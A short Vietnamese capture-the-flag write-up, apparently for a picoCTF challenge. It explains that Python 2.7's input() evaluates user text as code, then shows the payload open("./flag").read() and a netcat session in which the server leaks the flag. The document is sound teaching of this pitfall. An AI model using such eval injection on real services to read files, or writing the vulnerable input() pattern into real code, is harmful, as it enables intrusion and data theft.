@@ -1,0 +1,20 @@
+- Ta để ý ở đoạn code sau trong source được cho. Ta sẽ được nhập format để in ra.
+```
+res = input("Number? ")
+print("You said: {}".format(res))
+```
+- Vì đây là Python 2.7, input() sẽ eval nội dung bạn nhập như code Python. Nên: ta sẽ tận dụng lỗi logic này nhập
+```
+open("./flag").read()
+```
+-> CHương trình sẽ leak luôn flag ra cho ta.
+
+
+$ nc wily-courier.picoctf.net 58543
+What's your favorite number?
+Number? open("./flag").read()
+You said: picoCTF{v4lua4bl3_1npu7_3a7b75f4}
+
+Okay...
+What's the best city to visit?
+City?
